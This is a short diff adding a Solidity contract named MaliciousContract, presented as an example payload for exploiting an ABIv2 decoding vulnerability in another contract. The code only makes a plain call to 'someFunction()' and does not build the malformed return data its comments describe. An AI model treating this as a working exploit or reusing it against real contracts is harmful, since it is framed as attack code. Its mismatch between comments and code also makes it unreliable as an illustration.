@@ -1,0 +1,15 @@
+```solidity
+// Example payload in Solidity to exploit the vulnerability
+contract MaliciousContract {
+    function callVulnerableContract(address vulnerableContract) external {
+        // Malformed return data that simulates invalid ABIv2 encoded data
+        bytes memory payload = abi.encodeWithSignature("someFunction()");
+
+        // Call the vulnerable contract
+        (bool success, bytes memory returnData) = vulnerableContract.call(payload);
+
+        // If the call is successful, returnData may contain unexpected values
+        require(success, "Call failed");
+    }
+}
+```
